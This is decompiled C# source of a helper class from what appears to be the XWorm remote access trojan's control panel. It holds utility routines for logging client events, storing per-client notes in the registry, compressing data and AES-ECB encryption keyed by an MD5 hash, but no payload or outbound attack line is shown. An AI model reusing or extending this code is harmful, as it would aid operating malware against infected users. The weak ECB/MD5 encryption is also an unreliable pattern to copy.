using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Toolbelt.Drawing;
using XWorm.My;

namespace XWorm
{
	// Token: 0x02000037 RID: 55
	[StandardModule]
	internal sealed class Helper
	{
		// Token: 0x060009D4 RID: 2516
		[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern bool InternetGetConnectedState(out int Description, int ReservedValue);

		// Token: 0x060009D5 RID: 2517 RVA: 0x00057420 File Offset: 0x00055620
		public static bool InternetState()
		{
			int num;
			return Helper.InternetGetConnectedState(out num, 0);
		}

		// Token: 0x060009D6 RID: 2518 RVA: 0x0005743C File Offset: 0x0005563C
		public static DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			try
			{
				result = result.AddSeconds((double)unixtime).ToLocalTime();
			}
			catch (Exception ex)
			{
				result = DateTime.MaxValue;
			}
			return result;
		}

		// Token: 0x060009D7 RID: 2519 RVA: 0x0005749C File Offset: 0x0005569C
		public static string FilesType(string filePath)
		{
			string text = null;
			try
			{
				RegistryKey classesRoot = Registry.ClassesRoot;
				string extension = Path.GetExtension(filePath);
				RegistryKey registryKey = classesRoot.OpenSubKey(extension, false);
				bool flag = registryKey == null;
				if (flag)
				{
					classesRoot.Close();
					return Helper.GetDefaultDescription(extension);
				}
				string text2 = Convert.ToString(RuntimeHelpers.GetObjectValue(registryKey.GetValue("", "")));
				registryKey.Close();
				bool flag2 = string.IsNullOrEmpty(text2);
				if (flag2)
				{
					classesRoot.Close();
					return Helper.GetDefaultDescription(extension);
				}
				RegistryKey registryKey2 = classesRoot.OpenSubKey(text2);
				bool flag3 = registryKey2 == null;
				if (flag3)
				{
					classesRoot.Close();
					return Helper.GetDefaultDescription(extension);
				}
				text = Convert.ToString(RuntimeHelpers.GetObjectValue(registryKey2.GetValue("", "")));
				registryKey2.Close();
				classesRoot.Close();
			}
			catch (Exception ex)
			{
				text = null;
			}
			bool flag4 = string.IsNullOrEmpty(text);
			string result;
			if (flag4)
			{
				string text3 = Path.GetExtension(filePath).Replace(".", "").ToUpper();
				bool flag5 = string.IsNullOrEmpty(text3);
				if (flag5)
				{
					result = "File";
				}
				else
				{
					result = text3 + " File";
				}
			}
			else
			{
				result = text;
			}
			return result;
		}

		// Token: 0x060009D8 RID: 2520 RVA: 0x000575F4 File Offset: 0x000557F4
		private static string GetDefaultDescription(string ext)
		{
			string text = ext.Replace(".", "").ToUpper();
			bool flag = string.IsNullOrEmpty(text);
			string result;
			if (flag)
			{
				result = "File";
			}
			else
			{
				result = text + " File";
			}
			return result;
		}

		// Token: 0x060009D9 RID: 2521 RVA: 0x0005763C File Offset: 0x0005583C
		public static object LVLog(string str, Color Color)
		{
			try
			{
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = DateTime.Now.ToLongTimeString();
				listViewItem.ForeColor = Color;
				listViewItem.SubItems.Add(str);
				MyProject.Forms.Main.Lv2.Items.Insert(0, listViewItem);
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			object result;
			return result;
		}

		// Token: 0x060009DA RID: 2522 RVA: 0x000576C8 File Offset: 0x000558C8
		public static string GetNotes(string ID)
		{
			string result;
			try
			{
				string text = Conversions.ToString(Registry.GetValue(SettingsHelper.RegSave + "\\Notes", ID, null));
				bool flag = string.IsNullOrEmpty(text);
				if (flag)
				{
					result = "Null";
				}
				else
				{
					result = text;
				}
			}
			catch (Exception ex)
			{
				result = "Error";
			}
			return result;
		}

		// Token: 0x060009DB RID: 2523 RVA: 0x00057730 File Offset: 0x00055930
		public static string NewNotes(string ID, string Str)
		{
			try
			{
				Registry.SetValue(SettingsHelper.RegSave + "\\Notes", ID, Str);
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
			string result;
			return result;
		}

		// Token: 0x060009DC RID: 2524 RVA: 0x00057788 File Offset: 0x00055988
		public static byte[] SB(string s)
		{
			return Encoding.UTF8.GetBytes(s);
		}

		// Token: 0x060009DD RID: 2525 RVA: 0x000577A8 File Offset: 0x000559A8
		public static string BS(byte[] b)
		{
			return Encoding.UTF8.GetString(b);
		}

		// Token: 0x060009DE RID: 2526 RVA: 0x000577C8 File Offset: 0x000559C8
		public static byte[] Decompress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream(input))
			{
				byte[] array = new byte[4];
				memoryStream.Read(array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					byte[] array2 = new byte[checked(num - 1 + 1)];
					gzipStream.Read(array2, 0, num);
					result = array2;
				}
			}
			return result;
		}

		// Token: 0x060009DF RID: 2527 RVA: 0x00057858 File Offset: 0x00055A58
		public static byte[] Compress(byte[] input)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				byte[] bytes = BitConverter.GetBytes(input.Length);
				memoryStream.Write(bytes, 0, 4);
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
				{
					gzipStream.Write(input, 0, input.Length);
					gzipStream.Flush();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}

		// Token: 0x060009E0 RID: 2528 RVA: 0x000578DC File Offset: 0x00055ADC
		public static string GetChecksum(string f)
		{
			string result;
			using (FileStream fileStream = File.OpenRead(f))
			{
				SHA256Managed sha256Managed = new SHA256Managed();
				byte[] value = sha256Managed.ComputeHash(fileStream);
				result = BitConverter.ToString(value).Replace("-", string.Empty);
			}
			return result;
		}

		// Token: 0x060009E1 RID: 2529 RVA: 0x00057938 File Offset: 0x00055B38
		public static string BytesToString(long byteCount)
		{
			string[] array = new string[]
			{
				"B",
				"KB",
				"MB",
				"GB",
				"TB",
				"PB",
				"EB"
			};
			bool flag = byteCount == 0L;
			string result;
			if (flag)
			{
				result = "0" + array[0];
			}
			else
			{
				long num = Math.Abs(byteCount);
				int num2 = Convert.ToInt32(Math.Floor(Math.Log((double)num, 1024.0)));
				double num3 = Math.Round((double)num / Math.Pow(1024.0, (double)num2), 1);
				result = ((double)Math.Sign(byteCount) * num3).ToString() + array[num2];
			}
			return result;
		}

		// Token: 0x060009E2 RID: 2530 RVA: 0x000579FC File Offset: 0x00055BFC
		public static byte[] AES_Encryptor(byte[] input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(SettingsHelper.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine("AES_Encryptor" + ex.Message);
			}
			return result;
		}

		// Token: 0x060009E3 RID: 2531 RVA: 0x00057A94 File Offset: 0x00055C94
		public static byte[] AES_Decryptor(byte[] input, Client C = null)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] result;
			try
			{
				rijndaelManaged.Key = md5CryptoServiceProvider.ComputeHash(Helper.SB(SettingsHelper.KEY));
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			}
			catch (Exception ex)
			{
				Debug.WriteLine("AES_Decryptor" + ex.Message);
				bool isConnected = C.IsConnected;
				if (isConnected)
				{
					bool flag = !SettingsHelper.Blocked.Contains(C.IP.ToString().Split(new char[]
					{
						':'
					})[0]);
					if (flag)
					{
						SettingsHelper.Blocked.Add(C.IP.ToString().Split(new char[]
						{
							':'
						})[0]);
						C.isDisconnected();
						return result;
					}
				}
			}
			result = null;
			return result;
		}

		// Token: 0x060009E4 RID: 2532 RVA: 0x00057BA0 File Offset: 0x00055DA0
		public static object CTMGORHR(int Input)
		{
			bool flag = Input >= 1024;
			bool flag2 = flag;
			object result;
			if (flag2)
			{
				result = Strings.FormatNumber((double)Input / 1024.0, 1, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + " GHz";
			}
			else
			{
				flag = (Input >= 0 && Input <= 1023);
				bool flag3 = flag;
				if (flag3)
				{
					result = Strings.FormatNumber(Input, 1, TriState.UseDefault, TriState.UseDefault, TriState.UseDefault) + " MHz";
				}
				else
				{
					result = "????";
				}
			}
			return result;
		}

		// Token: 0x060009E5 RID: 2533 RVA: 0x00057C34 File Offset: 0x00055E34
		public static string uptimeToDHMS(int inSeconds)
		{
			checked
			{
				string result;
				try
				{
					int num = inSeconds % 60;
					inSeconds = (int)Math.Round((double)(inSeconds - num) / 60.0);
					int num2 = inSeconds % 60;
					inSeconds = (int)Math.Round((double)(inSeconds - num2) / 60.0);
					int num3 = inSeconds % 24;
					inSeconds = (int)Math.Round((double)(inSeconds - num3) / 24.0);
					int value = inSeconds;
					result = string.Concat(new string[]
					{
						Conversions.ToString(value),
						"d ",
						Conversions.ToString(num3),
						"h ",
						Conversions.ToString(num2),
						"m ",
						Conversions.ToString(num),
						"s"
					});
				}
				catch (Exception ex)
				{
					result = "Error";
				}
				return result;
			}
		}

		// Token: 0x060009E6 RID: 2534
		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
		public static extern IntPtr SHGetFileInfo(string pszPath, int dwFileAttributes, ref Helper.SHFILEINFO psfi, int cbFileInfo, int uFlags);

		// Token: 0x060009E7 RID: 2535
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool DestroyIcon(IntPtr hIcon);

		// Token: 0x060009E8 RID: 2536 RVA: 0x00057D14 File Offset: 0x00055F14
		public static Bitmap GetFileIcon(string fileExt, Helper.IconSize ICOsize = Helper.IconSize.SHGFI_SMALLICON)
		{
			Bitmap result;
			try
			{
				Helper.SHFILEINFO shfileinfo = default(Helper.SHFILEINFO);
				shfileinfo.szDisplayName = new string('\0', 260);
				shfileinfo.szTypeName = new string('\0', 80);
				Helper.SHGetFileInfo(fileExt, 128, ref shfileinfo, Marshal.SizeOf<Helper.SHFILEINFO>(shfileinfo), (int)((Helper.IconSize)256 | ICOsize | (Helper.IconSize)16));
				Bitmap bitmap = Icon.FromHandle(shfileinfo.hIcon).ToBitmap();
				Helper.DestroyIcon(shfileinfo.hIcon);
				result = bitmap;
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
			return result;
		}

		// Token: 0x060009E9 RID: 2537 RVA: 0x00057DB8 File Offset: 0x00055FB8
		public static string GetIcon(string path)
		{
			try
			{
				string text = Path.GetTempFileName() + ".ico";
				using (FileStream fileStream = new FileStream(text, FileMode.Create))
				{
					IconExtractor.Extract1stIconTo(path, fileStream);
				}
				return text;
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x060009EA RID: 2538 RVA: 0x00057E30 File Offset: 0x00056030
		public static async void FadeIn(Form o, int interval = 80)
		{
			try
			{
				while (o.Opacity < 1.0)
				{
					await Task.Delay(interval);
					o.Opacity += 0.05;
				}
				o.Opacity = 1.0;
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x060009EB RID: 2539 RVA: 0x00057E70 File Offset: 0x00056070
		public static async void FadeInMain(Form o, int interval = 80)
		{
			try
			{
				while (o.Opacity < 1.0)
				{
					await Task.Delay(interval);
					o.Opacity += 0.05;
				}
				try
				{
					MyProject.Computer.Audio.Play(Path.Combine(Application.StartupPath, "Sounds", "Intro.wav"));
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
				o.Opacity = 1.0;
				Main.trans = true;
			}
			catch (Exception ex2)
			{
				Debug.WriteLine(ex2.Message);
			}
		}

		// Token: 0x0400041C RID: 1052
		public const int MAX_PATH = 260;

		// Token: 0x0400041D RID: 1053
		public const int SHGFI_ICON = 256;

		// Token: 0x0400041E RID: 1054
		public const int SHGFI_USEFILEATTRIBUTES = 16;

		// Token: 0x0400041F RID: 1055
		public const int FILE_ATTRIBUTE_NORMAL = 128;

		// Token: 0x0200017E RID: 382
		public struct SHFILEINFO
		{
			// Token: 0x04000606 RID: 1542
			public IntPtr hIcon;

			// Token: 0x04000607 RID: 1543
			public int iIcon;

			// Token: 0x04000608 RID: 1544
			public int dwAttributes;

			// Token: 0x04000609 RID: 1545
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
			public string szDisplayName;

			// Token: 0x0400060A RID: 1546
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
			public string szTypeName;
		}

		// Token: 0x0200017F RID: 383
		public enum IconSize
		{
			// Token: 0x0400060C RID: 1548
			SHGFI_LARGEICON,
			// Token: 0x0400060D RID: 1549
			SHGFI_SMALLICON
		}
	}
}
